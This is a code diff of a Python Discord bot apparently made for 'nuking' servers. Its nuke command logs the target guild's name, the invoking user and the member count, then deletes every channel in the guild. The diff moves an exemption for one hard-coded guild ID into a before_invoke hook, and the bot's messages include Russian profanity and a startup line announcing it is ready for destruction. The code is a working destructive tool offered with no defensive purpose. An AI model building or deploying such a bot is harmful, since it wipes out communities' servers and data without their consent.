@@ -35,6 +35,14 @@ def ping_self():
 
 bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())
 
+PROTECTED_GUILD_ID = 1520817743127904477
+
+@bot.before_invoke
+async def protect_server(ctx):
+    if ctx.guild and ctx.guild.id == PROTECTED_GUILD_ID:
+        await ctx.send("нафиг")
+        raise commands.CommandError("Protected server")
+
 @bot.event
 async def on_ready():
     print(f"Бот {bot.user} готов к уничтожению")
@@ -66,11 +74,7 @@ async def send_crash_log(guild_name, author, member_count):
 @bot.command()
 async def nuke(ctx):
     guild = ctx.guild
-    
-    if guild.id == 1520817743127904477:
-        await ctx.send("пошёл нахуй")
-        return
-    
+
     await send_crash_log(guild.name, ctx.author.mention, guild.member_count)
     
     delete_tasks = [channel.delete() for channel in guild.channels]
